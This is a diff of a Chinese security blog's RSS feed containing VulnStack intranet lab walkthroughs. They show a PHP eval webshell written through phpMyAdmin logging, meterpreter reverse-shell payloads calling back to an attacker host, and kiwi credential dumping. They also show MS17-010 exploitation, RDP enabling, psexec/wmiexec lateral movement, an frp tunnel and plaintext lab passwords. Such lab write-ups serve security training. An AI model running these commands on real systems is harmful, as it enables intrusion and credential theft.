+	srcset="https://fragrant1001.github.io/post/2023/vulnstack03/image-7_hu25d855c14b724ee34599889b1166bbe5_414087_480x0_resize_box_3.png 480w, https://fragrant1001.github.io/post/2023/vulnstack03/image-7_hu25d855c14b724ee34599889b1166bbe5_414087_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
 	
-		alt=&#34;域控&#34;
+		alt="域控"
 	
 	
-		class=&#34;gallery-image&#34; 
-		data-flex-grow=&#34;215&#34;
-		data-flex-basis=&#34;517px&#34;
+		class="gallery-image" 
+		data-flex-grow="215"
+		data-flex-basis="517px"
 	
 &gt;&lt;/p&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;Administrator  TEST.ORG  zxcASDqw123!!
+&lt;pre tabindex="0"&gt;&lt;code&gt;Administrator  TEST.ORG  zxcASDqw123!!
 Administrator  WIN2008   123qwe!ASD
 &lt;/code&gt;&lt;/pre&gt;&lt;p&gt;msf上线不了10机器，改用&lt;code&gt;impacket-wmiexec&lt;/code&gt;执行命令&lt;/p&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;proxychains -q impacket-wmiexec test.org/administrator@192.168.93.10
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src=&#34;https://fragrant1001.github.io/post/2023/vulnstack03/image-8.png&#34;
-	width=&#34;1246&#34;
-	height=&#34;994&#34;
-	srcset=&#34;https://fragrant1001.github.io/post/2023/vulnstack03/image-8_hubfaa5b3e566a080f387e78221eb10188_485318_480x0_resize_box_3.png 480w, https://fragrant1001.github.io/post/2023/vulnstack03/image-8_hubfaa5b3e566a080f387e78221eb10188_485318_1024x0_resize_box_3.png 1024w&#34;
-	loading=&#34;lazy&#34;
+&lt;pre tabindex="0"&gt;&lt;code&gt;proxychains -q impacket-wmiexec test.org/administrator@192.168.93.10
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src="https://fragrant1001.github.io/post/2023/vulnstack03/image-8.png"
+	width="1246"
+	height="994"
+	srcset="https://fragrant1001.github.io/post/2023/vulnstack03/image-8_hubfaa5b3e566a080f387e78221eb10188_485318_480x0_resize_box_3.png 480w, https://fragrant1001.github.io/post/2023/vulnstack03/image-8_hubfaa5b3e566a080f387e78221eb10188_485318_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
 	
-		alt=&#34;10拿下&#34;
+		alt="10拿下"
 	
 	
-		class=&#34;gallery-image&#34; 
-		data-flex-grow=&#34;125&#34;
-		data-flex-basis=&#34;300px&#34;
+		class="gallery-image" 
+		data-flex-grow="125"
+		data-flex-basis="300px"
 	
 &gt;&lt;/p&gt;
-&lt;h3 id=&#34;30windows&#34;&gt;30windows&lt;/h3&gt;
+&lt;h3 id="30windows"&gt;30windows&lt;/h3&gt;
 &lt;p&gt;impacket-wmiexec上线，密码&lt;code&gt;123qwe!ASD&lt;/code&gt;。注意不要加域&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://fragrant1001.github.io/post/2023/vulnstack03/image-9.png&#34;
-	width=&#34;1116&#34;
-	height=&#34;736&#34;
-	srcset=&#34;https://fragrant1001.github.io/post/2023/vulnstack03/image-9_hufe100cbbccbb3179ec81bb06a1190742_359827_480x0_resize_box_3.png 480w, https://fragrant1001.github.io/post/2023/vulnstack03/image-9_hufe100cbbccbb3179ec81bb06a1190742_359827_1024x0_resize_box_3.png 1024w&#34;
-	loading=&#34;lazy&#34;
+&lt;p&gt;&lt;img src="https://fragrant1001.github.io/post/2023/vulnstack03/image-9.png"
+	width="1116"
+	height="736"
+	srcset="https://fragrant1001.github.io/post/2023/vulnstack03/image-9_hufe100cbbccbb3179ec81bb06a1190742_359827_480x0_resize_box_3.png 480w, https://fragrant1001.github.io/post/2023/vulnstack03/image-9_hufe100cbbccbb3179ec81bb06a1190742_359827_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
 	
-		alt=&#34;30&#34;
+		alt="30"
 	
 	
-		class=&#34;gallery-image&#34; 
-		data-flex-grow=&#34;151&#34;
-		data-flex-basis=&#34;363px&#34;
+		class="gallery-image" 
+		data-flex-grow="151"
+		data-flex-basis="363px"
 	
 &gt;&lt;/p&gt;
 &lt;p&gt;msf上线，也是不要加域&lt;/p&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;msf6 exploit(windows/smb/psexec) &amp;gt; set RHOSTS 192.168.93.30                                                                                                
+&lt;pre tabindex="0"&gt;&lt;code&gt;msf6 exploit(windows/smb/psexec) &amp;gt; set RHOSTS 192.168.93.30                                                                                                
 msf6 exploit(windows/smb/psexec) &amp;gt; set SMBDomain .                                                                                                         
 msf6 exploit(windows/smb/psexec) &amp;gt; set SMBPass 123qwe!ASD                                                                                                  
 msf6 exploit(windows/smb/psexec) &amp;gt; exploit
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src=&#34;https://fragrant1001.github.io/post/2023/vulnstack03/image-10.png&#34;
-	width=&#34;1450&#34;
-	height=&#34;1152&#34;
-	srcset=&#34;https://fragrant1001.github.io/post/2023/vulnstack03/image-10_hu4bd79718a8350c5db0fdcc5c26c14e62_657837_480x0_resize_box_3.png 480w, https://fragrant1001.github.io/post/2023/vulnstack03/image-10_hu4bd79718a8350c5db0fdcc5c26c14e62_657837_1024x0_resize_box_3.png 1024w&#34;
-	loading=&#34;lazy&#34;
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src="https://fragrant1001.github.io/post/2023/vulnstack03/image-10.png"
+	width="1450"
+	height="1152"
+	srcset="https://fragrant1001.github.io/post/2023/vulnstack03/image-10_hu4bd79718a8350c5db0fdcc5c26c14e62_657837_480x0_resize_box_3.png 480w, https://fragrant1001.github.io/post/2023/vulnstack03/image-10_hu4bd79718a8350c5db0fdcc5c26c14e62_657837_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
 	
-		alt=&#34;msf30&#34;
+		alt="msf30"
 	
 	
-		class=&#34;gallery-image&#34; 
-		data-flex-grow=&#34;125&#34;
-		data-flex-basis=&#34;302px&#34;
+		class="gallery-image" 
+		data-flex-grow="125"
+		data-flex-basis="302px"
 	
 &gt;&lt;/p&gt;
 </description>
-        </item>
-        <item>
-        <title>VulnStack内网靶场（一）</title>
-        <link>https://fragrant1001.github.io/post/2023/vulnstack01/</link>
-        <pubDate>Wed, 18 Oct 2023 17:12:23 +0800</pubDate>
-        
-        <guid>https://fragrant1001.github.io/post/2023/vulnstack01/</guid>
-        <description>&lt;img src="https://fragrant1001.github.io/post/2023/vulnstack01/cover.jpg" alt="Featured image of post VulnStack内网靶场（一）" /&gt;&lt;h3 id=&#34;通过web端拿shell&#34;&gt;通过web端拿shell&lt;/h3&gt;
+</item>
+<item>
+<title>VulnStack内网靶场（一）</title>
+<link>https://fragrant1001.github.io/post/2023/vulnstack01/</link>
+<pubDate>Wed, 18 Oct 2023 17:12:23 +0800</pubDate>
+<guid>https://fragrant1001.github.io/post/2023/vulnstack01/</guid>
+<description>&lt;img src="https://fragrant1001.github.io/post/2023/vulnstack01/cover.jpg" alt="Featured image of post VulnStack内网靶场（一）" /&gt;&lt;h3 id="通过web端拿shell"&gt;通过web端拿shell&lt;/h3&gt;
 &lt;p&gt;phpMyadmin弱口令进去，开启general_log和配置general_log_file值,写入一句话木马.&lt;/p&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;SHOW VARIABLES LIKE &amp;#34;general_log%&amp;#34;;
+&lt;pre tabindex="0"&gt;&lt;code&gt;SHOW VARIABLES LIKE &amp;#34;general_log%&amp;#34;;
 set global general_log = &amp;#34;ON&amp;#34;;
 set global general_log_file = &amp;#34;C:/phpStudy/WWW/a1.php&amp;#34;;
 select &amp;#39;&amp;lt;?php @eval($_POST[1]);?&amp;gt;&amp;#39;;
 &lt;/code&gt;&lt;/pre&gt;&lt;p&gt;hackbar测试
-&lt;img src=&#34;https://fragrant1001.github.io/post/2023/vulnstack01/image.png&#34;
-	width=&#34;1902&#34;
-	height=&#34;974&#34;
-	srcset=&#34;https://fragrant1001.github.io/post/2023/vulnstack01/image_hu7d7073c798ca50a40479808a04c60b0b_650327_480x0_resize_box_3.png 480w, https://fragrant1001.github.io/post/2023/vulnstack01/image_hu7d7073c798ca50a40479808a04c60b0b_650327_1024x0_resize_box_3.png 1024w&#34;
-	loading=&#34;lazy&#34;
+&lt;img src="https://fragrant1001.github.io/post/2023/vulnstack01/image.png"
+	width="1902"
+	height="974"
+	srcset="https://fragrant1001.github.io/post/2023/vulnstack01/image_hu7d7073c798ca50a40479808a04c60b0b_650327_480x0_resize_box_3.png 480w, https://fragrant1001.github.io/post/2023/vulnstack01/image_hu7d7073c798ca50a40479808a04c60b0b_650327_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
 	
-		alt=&#34;hackbar&#34;
+		alt="hackbar"
 	
 	
-		class=&#34;gallery-image&#34; 
-		data-flex-grow=&#34;195&#34;
-		data-flex-basis=&#34;468px&#34;
+		class="gallery-image" 
+		data-flex-grow="195"
+		data-flex-basis="468px"
 	
 &gt;&lt;/p&gt;
-&lt;h3 id=&#34;colbaltstrike速通&#34;&gt;ColbaltStrike速通&lt;/h3&gt;
+&lt;h3 id="colbaltstrike速通"&gt;ColbaltStrike速通&lt;/h3&gt;
 &lt;p&gt;建立Listeners-创建Scripted Web Delivery给到webshell去执行和返回session(失败了)&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://fragrant1001.github.io/post/2023/vulnstack01/image-1.png&#34;
-	width=&#34;1728&#34;
-	height=&#34;772&#34;
-	srcset=&#34;https://fragrant1001.github.io/post/2023/vulnstack01/image-1_hu1c2da9882db39ab17b426164c9349590_204877_480x0_resize_box_3.png 480w, https://fragrant1001.github.io/post/2023/vulnstack01/image-1_hu1c2da9882db39ab17b426164c9349590_204877_1024x0_resize_box_3.png 1024w&#34;
-	loading=&#34;lazy&#34;
+&lt;p&gt;&lt;img src="https://fragrant1001.github.io/post/2023/vulnstack01/image-1.png"
+	width="1728"
+	height="772"
+	srcset="https://fragrant1001.github.io/post/2023/vulnstack01/image-1_hu1c2da9882db39ab17b426164c9349590_204877_480x0_resize_box_3.png 480w, https://fragrant1001.github.io/post/2023/vulnstack01/image-1_hu1c2da9882db39ab17b426164c9349590_204877_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
 	
-		alt=&#34;attack&#34;
+		alt="attack"
 	
 	
-		class=&#34;gallery-image&#34; 
-		data-flex-grow=&#34;223&#34;
-		data-flex-basis=&#34;537px&#34;
+		class="gallery-image" 
+		data-flex-grow="223"
+		data-flex-basis="537px"
 	
 &gt;&lt;/p&gt;
 &lt;p&gt;上传可执行木马并执行返回session
-&lt;img src=&#34;https://fragrant1001.github.io/post/2023/vulnstack01/image-2.png&#34;
-	width=&#34;736&#34;
-	height=&#34;324&#34;
-	srcset=&#34;https://fragrant1001.github.io/post/2023/vulnstack01/image-2_hu4eea459e8727aba1bb325da76d87c139_102953_480x0_resize_box_3.png 480w, https://fragrant1001.github.io/post/2023/vulnstack01/image-2_hu4eea459e8727aba1bb325da76d87c139_102953_1024x0_resize_box_3.png 1024w&#34;
-	loading=&#34;lazy&#34;
+&lt;img src="https://fragrant1001.github.io/post/2023/vulnstack01/image-2.png"
+	width="736"
+	height="324"
+	srcset="https://fragrant1001.github.io/post/2023/vulnstack01/image-2_hu4eea459e8727aba1bb325da76d87c139_102953_480x0_resize_box_3.png 480w, https://fragrant1001.github.io/post/2023/vulnstack01/image-2_hu4eea459e8727aba1bb325da76d87c139_102953_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
 	
-		alt=&#34;exe&#34;
+		alt="exe"
 	
 	
-		class=&#34;gallery-image&#34; 
-		data-flex-grow=&#34;227&#34;
-		data-flex-basis=&#34;545px&#34;
+		class="gallery-image" 
+		data-flex-grow="227"
+		data-flex-basis="545px"
 	
 &gt;&lt;/p&gt;
 &lt;p&gt;net view看内网其它机器&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://fragrant1001.github.io/post/2023/vulnstack01/image-3.png&#34;
-	width=&#34;1470&#34;
-	height=&#34;1624&#34;
-	srcset=&#34;https://fragrant1001.github.io/post/2023/vulnstack01/image-3_hu616f617cbdb78125755f3d71f3e9684e_340969_480x0_resize_box_3.png 480w, https://fragrant1001.github.io/post/2023/vulnstack01/image-3_hu616f617cbdb78125755f3d71f3e9684e_340969_1024x0_resize_box_3.png 1024w&#34;
-	loading=&#34;lazy&#34;
+&lt;p&gt;&lt;img src="https://fragrant1001.github.io/post/2023/vulnstack01/image-3.png"
+	width="1470"
+	height="1624"
+	srcset="https://fragrant1001.github.io/post/2023/vulnstack01/image-3_hu616f617cbdb78125755f3d71f3e9684e_340969_480x0_resize_box_3.png 480w, https://fragrant1001.github.io/post/2023/vulnstack01/image-3_hu616f617cbdb78125755f3d71f3e9684e_340969_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
 	
-		alt=&#34;show targets&#34;
+		alt="show targets"
 	
 	
-		class=&#34;gallery-image&#34; 
-		data-flex-grow=&#34;90&#34;
-		data-flex-basis=&#34;217px&#34;
+		class="gallery-image" 
+		data-flex-grow="90"
+		data-flex-basis="217px"
 	
 &gt;&lt;/p&gt;
 &lt;p&gt;新建一个Listeners横向移动拿其它内网主机session(因为当前域控管理员账户，所以可以直接横向移动)&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://fragrant1001.github.io/post/2023/vulnstack01/image-4.png&#34;
-	width=&#34;1180&#34;
-	height=&#34;454&#34;
-	srcset=&#34;https://fragrant1001.github.io/post/2023/vulnstack01/image-4_hu281bfc6bdb3f19c8ec5c4ffebf3a05d6_145973_480x0_resize_box_3.png 480w, https://fragrant1001.github.io/post/2023/vulnstack01/image-4_hu281bfc6bdb3f19c8ec5c4ffebf3a05d6_145973_1024x0_resize_box_3.png 1024w&#34;
-	loading=&#34;lazy&#34;
+&lt;p&gt;&lt;img src="https://fragrant1001.github.io/post/2023/vulnstack01/image-4.png"
+	width="1180"
+	height="454"
+	srcset="https://fragrant1001.github.io/post/2023/vulnstack01/image-4_hu281bfc6bdb3f19c8ec5c4ffebf3a05d6_145973_480x0_resize_box_3.png 480w, https://fragrant1001.github.io/post/2023/vulnstack01/image-4_hu281bfc6bdb3f19c8ec5c4ffebf3a05d6_145973_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
 	
-		alt=&#34;psexec&#34;
+		alt="psexec"
 	
 	
-		class=&#34;gallery-image&#34; 
-		data-flex-grow=&#34;259&#34;
-		data-flex-basis=&#34;623px&#34;
+		class="gallery-image" 
+		data-flex-grow="259"
+		data-flex-basis="623px"
 	
 &gt;&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://fragrant1001.github.io/post/2023/vulnstack01/image-5.png&#34;
-	width=&#34;1136&#34;
-	height=&#34;758&#34;
-	srcset=&#34;https://fragrant1001.github.io/post/2023/vulnstack01/image-5_hu92b8bc6610b2b7694b0e6cb9e49cd4cc_115144_480x0_resize_box_3.png 480w, https://fragrant1001.github.io/post/2023/vulnstack01/image-5_hu92b8bc6610b2b7694b0e6cb9e49cd4cc_115144_1024x0_resize_box_3.png 1024w&#34;
-	loading=&#34;lazy&#34;
+&lt;p&gt;&lt;img src="https://fragrant1001.github.io/post/2023/vulnstack01/image-5.png"
+	width="1136"
+	height="758"
+	srcset="https://fragrant1001.github.io/post/2023/vulnstack01/image-5_hu92b8bc6610b2b7694b0e6cb9e49cd4cc_115144_480x0_resize_box_3.png 480w, https://fragrant1001.github.io/post/2023/vulnstack01/image-5_hu92b8bc6610b2b7694b0e6cb9e49cd4cc_115144_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
 	
-		alt=&#34;psexec2&#34;
+		alt="psexec2"
 	
 	
-		class=&#34;gallery-image&#34; 
-		data-flex-grow=&#34;149&#34;
-		data-flex-basis=&#34;359px&#34;
+		class="gallery-image" 
+		data-flex-grow="149"
+		data-flex-basis="359px"
 	
 &gt;&lt;/p&gt;
 &lt;p&gt;看见建立连接即表示成功
 &lt;code&gt;[+] established link to child beacon:&lt;/code&gt;&lt;/p&gt;
-&lt;h3 id=&#34;metasploit折腾&#34;&gt;Metasploit折腾&lt;/h3&gt;
+&lt;h3 id="metasploit折腾"&gt;Metasploit折腾&lt;/h3&gt;
 &lt;p&gt;启动-使用payload生成用于反弹shell的木马&lt;/p&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;sudo msfdb run
+&lt;pre tabindex="0"&gt;&lt;code&gt;sudo msfdb run
 use payload/windows/x64/meterpreter/reverse_tcp
 options
 set LHOST 10.0.0.18
@@ -513,46 +510,46 @@ generate -f exe -o win_5555.exe
 &lt;/code&gt;&lt;/pre&gt;&lt;p&gt;方便一点的就直接用msfvenom直接生成&lt;br&gt;
 &lt;code&gt;msfvenom  -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.0.18 LPORT=5556 -f exe -o win_5556.exe&lt;/code&gt;&lt;/p&gt;
 &lt;p&gt;监听本地端口&lt;/p&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;use exploit/multi/handler
+&lt;pre tabindex="0"&gt;&lt;code&gt;use exploit/multi/handler
 set LHOST 10.0.0.18
 set LPORT 5555
 set payload windows/x64/meterpreter/reverse_tcp
 exploit
 &lt;/code&gt;&lt;/pre&gt;&lt;p&gt;上传木马反弹会话&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://fragrant1001.github.io/post/2023/vulnstack01/image-6.png&#34;
-	width=&#34;1560&#34;
-	height=&#34;224&#34;
-	srcset=&#34;https://fragrant1001.github.io/post/2023/vulnstack01/image-6_hu05ce3ca8c437651704a52bab26db4bb2_113096_480x0_resize_box_3.png 480w, https://fragrant1001.github.io/post/2023/vulnstack01/image-6_hu05ce3ca8c437651704a52bab26db4bb2_113096_1024x0_resize_box_3.png 1024w&#34;
-	loading=&#34;lazy&#34;
+&lt;p&gt;&lt;img src="https://fragrant1001.github.io/post/2023/vulnstack01/image-6.png"
+	width="1560"
+	height="224"
+	srcset="https://fragrant1001.github.io/post/2023/vulnstack01/image-6_hu05ce3ca8c437651704a52bab26db4bb2_113096_480x0_resize_box_3.png 480w, https://fragrant1001.github.io/post/2023/vulnstack01/image-6_hu05ce3ca8c437651704a52bab26db4bb2_113096_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
 	
-		alt=&#34;meterpreter&#34;
+		alt="meterpreter"
 	
 	
-		class=&#34;gallery-image&#34; 
-		data-flex-grow=&#34;696&#34;
-		data-flex-basis=&#34;1671px&#34;
+		class="gallery-image" 
+		data-flex-grow="696"
+		data-flex-basis="1671px"
 	
 &gt;&lt;/p&gt;
 &lt;p&gt;加载kiwi模块抓密码&lt;/p&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;load kiwi
+&lt;pre tabindex="0"&gt;&lt;code&gt;load kiwi
 getsystem
 creds_kerberos
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src=&#34;https://fragrant1001.github.io/post/2023/vulnstack01/image-7.png&#34;
-	width=&#34;756&#34;
-	height=&#34;400&#34;
-	srcset=&#34;https://fragrant1001.github.io/post/2023/vulnstack01/image-7_hu2692766c7a1160f96f02662cdcbc03ae_208813_480x0_resize_box_3.png 480w, https://fragrant1001.github.io/post/2023/vulnstack01/image-7_hu2692766c7a1160f96f02662cdcbc03ae_208813_1024x0_resize_box_3.png 1024w&#34;
-	loading=&#34;lazy&#34;
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src="https://fragrant1001.github.io/post/2023/vulnstack01/image-7.png"
+	width="756"
+	height="400"
+	srcset="https://fragrant1001.github.io/post/2023/vulnstack01/image-7_hu2692766c7a1160f96f02662cdcbc03ae_208813_480x0_resize_box_3.png 480w, https://fragrant1001.github.io/post/2023/vulnstack01/image-7_hu2692766c7a1160f96f02662cdcbc03ae_208813_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
 	
-		alt=&#34;password&#34;
+		alt="password"
 	
 	
-		class=&#34;gallery-image&#34; 
-		data-flex-grow=&#34;189&#34;
-		data-flex-basis=&#34;453px&#34;
+		class="gallery-image" 
+		data-flex-grow="189"
+		data-flex-basis="453px"
 	
 &gt;&lt;/p&gt;
 &lt;p&gt;进Windows shell收集域信息&lt;/p&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;shell
+&lt;pre tabindex="0"&gt;&lt;code&gt;shell
 chcp 65001
 net view //域其它主机名称   \\OWA   \\ROOT-TVI862UBEH
 net time /domain //域信息owa.god.org
@@ -560,39 +557,39 @@ net user        //用户信息
 net user /domian
 net config workstation
 &lt;/code&gt;&lt;/pre&gt;&lt;p&gt;直接ping拿ip地址&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://fragrant1001.github.io/post/2023/vulnstack01/image-8.png&#34;
-	width=&#34;1008&#34;
-	height=&#34;602&#34;
-	srcset=&#34;https://fragrant1001.github.io/post/2023/vulnstack01/image-8_hue2660ad4bdd55e042d11fd3434f01947_295440_480x0_resize_box_3.png 480w, https://fragrant1001.github.io/post/2023/vulnstack01/image-8_hue2660ad4bdd55e042d11fd3434f01947_295440_1024x0_resize_box_3.png 1024w&#34;
-	loading=&#34;lazy&#34;
+&lt;p&gt;&lt;img src="https://fragrant1001.github.io/post/2023/vulnstack01/image-8.png"
+	width="1008"
+	height="602"
+	srcset="https://fragrant1001.github.io/post/2023/vulnstack01/image-8_hue2660ad4bdd55e042d11fd3434f01947_295440_480x0_resize_box_3.png 480w, https://fragrant1001.github.io/post/2023/vulnstack01/image-8_hue2660ad4bdd55e042d11fd3434f01947_295440_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
 	
-		alt=&#34;ip&#34;
+		alt="ip"
 	
 	
-		class=&#34;gallery-image&#34; 
-		data-flex-grow=&#34;167&#34;
-		data-flex-basis=&#34;401px&#34;
+		class="gallery-image" 
+		data-flex-grow="167"
+		data-flex-basis="401px"
 	
 &gt;&lt;/p&gt;
 &lt;p&gt;上传fscan扫描看看&lt;/p&gt;
 &lt;p&gt;&lt;code&gt;.\fscan64.exe -h 192.168.52.0/24&lt;/code&gt;&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://fragrant1001.github.io/post/2023/vulnstack01/image-9.png&#34;
-	width=&#34;1912&#34;
-	height=&#34;1028&#34;
-	srcset=&#34;https://fragrant1001.github.io/post/2023/vulnstack01/image-9_hudad9212bc120fa8c5ed86cff38c3ad41_583734_480x0_resize_box_3.png 480w, https://fragrant1001.github.io/post/2023/vulnstack01/image-9_hudad9212bc120fa8c5ed86cff38c3ad41_583734_1024x0_resize_box_3.png 1024w&#34;
-	loading=&#34;lazy&#34;
+&lt;p&gt;&lt;img src="https://fragrant1001.github.io/post/2023/vulnstack01/image-9.png"
+	width="1912"
+	height="1028"
+	srcset="https://fragrant1001.github.io/post/2023/vulnstack01/image-9_hudad9212bc120fa8c5ed86cff38c3ad41_583734_480x0_resize_box_3.png 480w, https://fragrant1001.github.io/post/2023/vulnstack01/image-9_hudad9212bc120fa8c5ed86cff38c3ad41_583734_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
 	
-		alt=&#34;fscan&#34;
+		alt="fscan"
 	
 	
-		class=&#34;gallery-image&#34; 
-		data-flex-grow=&#34;185&#34;
-		data-flex-basis=&#34;446px&#34;
+		class="gallery-image" 
+		data-flex-grow="185"
+		data-flex-basis="446px"
 	
 &gt;&lt;/p&gt;
 &lt;p&gt;frp挂代理横向移动，c端上传到被攻击机器上，s端上传到vps上&lt;/p&gt;
 &lt;p&gt;frpc&lt;/p&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;serverAddr = &amp;#34;10.0.0.18&amp;#34;
+&lt;pre tabindex="0"&gt;&lt;code&gt;serverAddr = &amp;#34;10.0.0.18&amp;#34;
 serverPort = 7000
 
 
@@ -603,94 +600,94 @@ remotePort = 6002
 [proxies.plugin]
 type = &amp;#34;socks5&amp;#34;
 &lt;/code&gt;&lt;/pre&gt;&lt;p&gt;frps&lt;/p&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;bindAddr = &amp;#34;0.0.0.0&amp;#34;
+&lt;pre tabindex="0"&gt;&lt;code&gt;bindAddr = &amp;#34;0.0.0.0&amp;#34;
 bindPort = 7000
 &lt;/code&gt;&lt;/pre&gt;&lt;p&gt;设置msf路由和代理&lt;/p&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;meterpreter &amp;gt; run post/multi/manage/autoroute                                                                                                             
+&lt;pre tabindex="0"&gt;&lt;code&gt;meterpreter &amp;gt; run post/multi/manage/autoroute                                                                                                             
 meterpreter &amp;gt; bg
 ………………
 msf6 &amp;gt; setg Proxies socks5://127.0.0.1:6002
 msf6 &amp;gt; setg ReverseAllowProxy true
 &lt;/code&gt;&lt;/pre&gt;&lt;p&gt;138机器永恒之蓝漏洞利用&lt;/p&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;use auxiliary/admin/smb/ms17_010_command
+&lt;pre tabindex="0"&gt;&lt;code&gt;use auxiliary/admin/smb/ms17_010_command
 set RHOSTS 192.168.52.138
 set command &amp;#34;net user&amp;#34;
 exploit
 &lt;/code&gt;&lt;/pre&gt;&lt;p&gt;141机器可开启3389&lt;/p&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;set RHOSTS 192.168.52.141
+&lt;pre tabindex="0"&gt;&lt;code&gt;set RHOSTS 192.168.52.141
 set command &amp;#39;REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&amp;#34; &amp;#34;Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f&amp;#39;
 &lt;/code&gt;&lt;/pre&gt;&lt;p&gt;关闭2003的3389
-&lt;code&gt;set command &#39;REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&amp;quot; &amp;quot;Server /v fDenyTSConnections /t REG_DWORD /d 11111111 /f&#39;&lt;/code&gt;&lt;/p&gt;
+&lt;code&gt;set command 'REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&amp;quot; &amp;quot;Server /v fDenyTSConnections /t REG_DWORD /d 11111111 /f'&lt;/code&gt;&lt;/p&gt;
 &lt;p&gt;proxychains代理连接3389&lt;/p&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;proxychains rdesktop 192.168.52.141 -p hongrisec@2023 -u administrator
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src=&#34;https://fragrant1001.github.io/post/2023/vulnstack01/image-10.png&#34;
-	width=&#34;2332&#34;
-	height=&#34;836&#34;
-	srcset=&#34;https://fragrant1001.github.io/post/2023/vulnstack01/image-10_hud147a706b408b4c098e3e247ac11c354_620748_480x0_resize_box_3.png 480w, https://fragrant1001.github.io/post/2023/vulnstack01/image-10_hud147a706b408b4c098e3e247ac11c354_620748_1024x0_resize_box_3.png 1024w&#34;
-	loading=&#34;lazy&#34;
+&lt;pre tabindex="0"&gt;&lt;code&gt;proxychains rdesktop 192.168.52.141 -p hongrisec@2023 -u administrator
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src="https://fragrant1001.github.io/post/2023/vulnstack01/image-10.png"
+	width="2332"
+	height="836"
+	srcset="https://fragrant1001.github.io/post/2023/vulnstack01/image-10_hud147a706b408b4c098e3e247ac11c354_620748_480x0_resize_box_3.png 480w, https://fragrant1001.github.io/post/2023/vulnstack01/image-10_hud147a706b408b4c098e3e247ac11c354_620748_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
 	
-		alt=&#34;2003&#34;
+		alt="2003"
 	
 	
-		class=&#34;gallery-image&#34; 
-		data-flex-grow=&#34;278&#34;
-		data-flex-basis=&#34;669px&#34;
+		class="gallery-image" 
+		data-flex-grow="278"
+		data-flex-basis="669px"
 	
 &gt;&lt;/p&gt;
 </description>
-        </item>
-        <item>
-        <title>Frsssp点对点内网穿透</title>
-        <link>https://fragrant1001.github.io/post/2023/frpp2p/</link>
-        <pubDate>Fri, 20 Aug 2021 11:20:59 +0800</pubDate>
-        
-        <guid>https://fragrant1001.github.io/post/2023/frpp2p/</guid>
-        <description>&lt;img src="https://fragrant1001.github.io/post/2023/frpp2p/FRPcover.jpg" alt="Featured image of post Frsssp点对点内网穿透" /&gt;&lt;div class=&#34;hugo-encryptor-container&#34;&gt;
-  &lt;div class=&#34;hugo-encryptor-prompt&#34;&gt;
+</item>
+<item>
+<title>Frsssp点对点内网穿透</title>
+<link>https://fragrant1001.github.io/post/2023/frpp2p/</link>
+<pubDate>Fri, 20 Aug 2021 11:20:59 +0800</pubDate>
+<guid>https://fragrant1001.github.io/post/2023/frpp2p/</guid>
+<description>&lt;img src="https://fragrant1001.github.io/post/2023/frpp2p/FRPcover.jpg" alt="Featured image of post Frsssp点对点内网穿透" /&gt;&lt;p&gt;1&lt;/p&gt;
+&lt;div class="hugo-encryptor-container"&gt;
+  &lt;div class="hugo-encryptor-prompt"&gt;
     
       &lt;p&gt;文章的部分内容被密码保护：&lt;/p&gt;
     
   &lt;/div&gt;
-  &lt;div class=&#34;hugo-encryptor-form&#34;&gt;
+  &lt;div class="hugo-encryptor-form"&gt;
     &lt;input
-      class=&#34;hugo-encryptor-input&#34;
-      placeholder=&#39;请输入密码&#39;
+      class="hugo-encryptor-input"
+      placeholder='请输入密码'
     /&gt;
     &lt;input
-      class=&#34;hugo-encryptor-button&#34;
-      type=&#34;button&#34;
-      value=&#39;点击验证&#39;
-      onclick=&#34;_click_handler(this)&#34;
+      class="hugo-encryptor-button"
+      type="button"
+      value='点击验证'
+      onclick="_click_handler(this)"
